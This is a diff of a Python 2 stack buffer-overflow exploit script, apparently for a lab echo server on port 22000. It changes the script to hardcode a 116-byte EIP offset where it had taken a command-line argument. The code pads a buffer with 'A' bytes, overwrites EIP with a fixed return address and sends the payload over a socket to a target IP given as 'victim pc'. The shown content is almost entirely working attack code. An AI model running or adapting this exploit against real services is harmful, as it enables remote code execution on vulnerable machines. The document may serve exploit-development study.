@@ -1,6 +1,6 @@
 #!/usr/bin/python
 
-
+## NOTE: echo server uses port 22000
 
 import sys
 import argparse
@@ -12,16 +12,16 @@ program_description = "The program inputs ip and port of the victim pc"
 parser = argparse.ArgumentParser(program_description)
 parser.add_argument("target_ip", help="Target IP")
 parser.add_argument("target_port", type=int, help="Target Port")
-parser.add_argument("eip_offset", type=int, help="Eip offset at the moment of crash")
 args = parser.parse_args()
 
 # global parameters
-user_input = (args.target_ip, args.target_port, args.eip_offset)
+user_input = (args.target_ip, args.target_port)
 
 
 # function definitions
-def buffer_gen(eip_offset):
-    buf = 'A' * eip_offset
+def buffer_gen():
+    # 116 is the eip offset at the moment of the crash for this exploit
+    buf = 'A' * 116
     
     # adding the eip in format: reverse order due to endianess?
     eip = "\x12\x56\xE8\x77"
@@ -71,7 +71,7 @@ def socket_setup(ip, port):
 
 def main(input_tuple):          # Input tuple has the following structure: (ip, port, eipOffset)
     s = socket_setup(input_tuple[0], input_tuple[1])
-    buf = buffer_gen(input_tuple[2])
+    buf = buffer_gen()
 
     print "sending buffer: ", buf
     s.send(buf)
